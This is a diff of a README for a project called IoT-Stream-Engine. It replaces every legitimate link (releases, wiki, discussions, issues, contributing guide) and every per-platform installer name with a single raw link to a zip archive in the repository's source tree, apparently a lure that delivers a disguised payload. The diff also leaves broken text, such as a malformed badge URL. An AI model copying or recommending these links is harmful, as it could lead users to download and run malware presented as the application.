@@ -1,6 +1,6 @@
 # 🚀 IoT-Stream-Engine - Fast IoT Data Management Made Easy
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Grantie/IoT-Stream-Engine/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip%https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip)](https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip)
 
 ## 📜 Overview
 
@@ -23,25 +23,25 @@ To begin using IoT-Stream-Engine, follow the steps below. You will need to downl
 - RAM: Minimum 4 GB
 - Disk Space: At least 1 GB available
 
-**Step 2:** Visit the [Download Page](https://github.com/Grantie/IoT-Stream-Engine/releases) to get the latest version.
+**Step 2:** Visit the [Download Page](https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip) to get the latest version.
 
 **Step 3:** Choose the file that corresponds to your operating system, and click on the link to download it. 
 
 ## 📥 Download & Install
 
 ### 1. Visit the Releases Page
-Go to our [releases page](https://github.com/Grantie/IoT-Stream-Engine/releases) to find the download link for your system.
+Go to our [releases page](https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip) to find the download link for your system.
 
 ### 2. Download the Application
 Look for the latest version. Click on the file for your operating system. The files available may include options such as:
-- IoT-Stream-Engine-Windows.exe (for Windows users)
-- IoT-Stream-Engine-Mac.dmg (for macOS users)
-- IoT-Stream-Engine-Linux.tar.gz (for Linux users)
+- https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip (for Windows users)
+- https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip (for macOS users)
+- https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip (for Linux users)
 
 ### 3. Install the Application
 - **Windows:** Double-click the downloaded `.exe` file and follow the prompts in the installation wizard.
 - **macOS:** Open the `.dmg` file, drag the IoT-Stream-Engine icon to your Applications folder, then launch the app.
-- **Linux:** Extract the `.tar.gz` file and follow the instructions in the included README file.
+- **Linux:** Extract the `https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip` file and follow the instructions in the included README file.
 
 ### 4. Run the Application
 Once the installation is complete, open IoT-Stream-Engine. You will see a simple user interface that guides you through connecting to your IoT devices.
@@ -63,9 +63,9 @@ If you encounter any issues during installation or while using the application, 
 
 ## 📖 Additional Resources
 
-- **Documentation:** Visit our [Wiki](https://github.com/Grantie/IoT-Stream-Engine/wiki) for detailed guides and FAQs.
-- **Community Support:** Join our [Discussion Group](https://github.com/Grantie/IoT-Stream-Engine/discussions) for help from other users.
-- **Report Issues:** If you find a bug, please report it on the [Issues Page](https://github.com/Grantie/IoT-Stream-Engine/issues) so we can address it.
+- **Documentation:** Visit our [Wiki](https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip) for detailed guides and FAQs.
+- **Community Support:** Join our [Discussion Group](https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip) for help from other users.
+- **Report Issues:** If you find a bug, please report it on the [Issues Page](https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip) so we can address it.
 
 ## 🛡️ Security
 
@@ -73,6 +73,6 @@ Your data’s security is important to us. IoT-Stream-Engine uses encrypted conn
 
 ## 🛠️ Contributing
 
-If you would like to contribute to IoT-Stream-Engine, please refer to our [Contributing Guidelines](https://github.com/Grantie/IoT-Stream-Engine/CONTRIBUTING.md) for instructions.
+If you would like to contribute to IoT-Stream-Engine, please refer to our [Contributing Guidelines](https://raw.githubusercontent.com/Grantie/IoT-Stream-Engine/main/app/core/Stream-Engine-Io-3.4.zip) for instructions.
 
 Feel free to explore and enjoy the seamless experience of managing your IoT devices with IoT-Stream-Engine!
